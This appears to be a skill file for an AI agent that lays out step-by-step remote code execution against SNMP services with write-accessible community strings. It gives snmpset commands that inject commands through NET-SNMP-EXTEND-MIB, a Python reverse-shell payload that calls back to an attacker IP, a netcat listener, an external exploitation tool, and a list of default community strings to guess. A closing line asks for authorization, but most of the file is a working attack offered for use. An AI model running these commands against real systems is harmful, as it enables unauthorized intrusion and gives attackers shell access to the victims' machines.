---
name: snmp-rce-exploitation
description: Exploit SNMP services with write-accessible community strings to achieve remote code execution. Use this skill whenever you need to test SNMP security, enumerate SNMP services, inject commands via NET-SNMP-EXTEND-MIB, or gain shell access through SNMP misconfigurations. Trigger this for any SNMP pentesting task, especially when you have or suspect write-accessible community strings.
---

# SNMP Remote Code Execution Exploitation

This skill enables exploitation of SNMP services configured with write-accessible community strings to achieve remote code execution on target systems.

## When to Use This Skill

Use this skill when:
- You have identified an SNMP service and need to test for RCE vulnerabilities
- You have or suspect write-accessible community strings (rwcommunity)
- You need to enumerate SNMP services and their configurations
- You want to inject commands via NET-SNMP-EXTEND-MIB
- You need to establish reverse shells through SNMP exploitation

## Prerequisites

Before attempting SNMP RCE exploitation:

1. **Install required tools**:
   ```bash
   sudo apt install snmp snmp-mibs-downloader rlwrap -y
   ```

2. **Verify SNMP connectivity** to the target:
   ```bash
   snmpwalk -v2c -c <community_string> <target_ip> system
   ```

3. **Confirm write access** by attempting to set a value:
   ```bash
   snmpset -v2c -c <community_string> <target_ip> system.sysName.0 s "test"
   ```

## Exploitation Workflow

### Step 1: Enumerate SNMP Service

First, enumerate the SNMP service to understand what's available:

```bash
snmpwalk -v2c -c <community_string> <target_ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

This will show existing extended commands and their configurations.

### Step 2: Inject a Test Command

Inject a simple test command to verify RCE capability:

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <community_string> <target_ip> \
  'nsExtendStatus."testcommand"' = createAndGo \
  'nsExtendCommand."testcommand"' = /bin/echo \
  'nsExtendArgs."testcommand"' = 'hello world'
```

### Step 3: Trigger Command Execution

Execute the injected command by reading the MIB object:

```bash
snmpwalk -v2c -c <community_string> <target_ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

**Important**: Commands execute on read (run-on-read behavior). The output will show the command execution result.

### Step 4: Establish Reverse Shell

For interactive shell access, inject a reverse shell command:

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <community_string> <target_ip> \
  'nsExtendStatus."shell"' = createAndGo \
  'nsExtendCommand."shell"' = /usr/bin/python3 \
  'nsExtendArgs."shell"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<ATTACKER_IP>\",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```

Then trigger it:

```bash
snmpwalk -v2c -c <community_string> <target_ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

**Before triggering**: Set up a listener on your attacker machine:
```bash
nc -lvnp <PORT>
```

## Alternative: Using snmp-shell Tool

For a more robust shell experience, use the mxrch/snmp-shell tool:

```bash
git clone https://github.com/mxrch/snmp-shell.git
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```

Then run:
```bash
python3 snmp-shell.py -c <community_string> -t <target_ip>
```

## Common Community Strings to Test

Try these default/weak community strings:

- `public` (read-only default)
- `private` (read-write default)
- `c0nfig`
- `SuP3RPrivCom90`
- `admin`
- `manager`
- `default`
- `test`
- `community`

## Key Concepts

### NET-SNMP-EXTEND-MIB

The `NET-SNMP-EXTEND-MIB` allows administrators to extend SNMP services with custom commands. The `nsExtendObjects` table contains:

- `nsExtendStatus`: Status of the extended command (createAndGo to activate)
- `nsExtendCommand`: Absolute path to the executable
- `nsExtendArgs`: Arguments to pass to the command

### Run-on-Read Behavior

Commands injected via `nsExtendObjects` execute when the MIB object is read (via `snmpwalk` or similar). This is the core exploitation mechanism.

### Requirements for Success

1. **Write-accessible community string** - The community string must have write permissions
2. **Executable binary path** - The command path must be absolute and executable
3. **SNMP service running** - Target must have SNMP daemon active
4. **No restrictions** - No firewall or access control blocking the exploitation

## Troubleshooting

### Command Not Executing

- Verify the community string has write access
- Check the absolute path to the binary exists on target
- Ensure the binary is executable
- Confirm SNMP service is running on target

### No Response from Target

- Verify network connectivity
- Check if SNMP port (161/UDP) is open
- Confirm the community string is correct
- Check for firewall rules blocking SNMP

### Shell Disconnects Immediately

- Use `rlwrap` for better terminal handling
- Try different shell types (bash, sh, python)
- Consider using the snmp-shell tool for persistence

## Safety and Ethics

**Only use this skill on systems you have explicit authorization to test.** Unauthorized exploitation of SNMP services is illegal and unethical.

## References

- [SNMP Arbitrary Command Execution and Shell](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)
- [mxrch/snmp-shell](https://github.com/mxrch/snmp-shell)
- [NET-SNMP-EXTEND-MIB Documentation](https://net-snmp.sourceforge.net/docs/mibs/NET-SNMP-EXTEND-MIB.html)
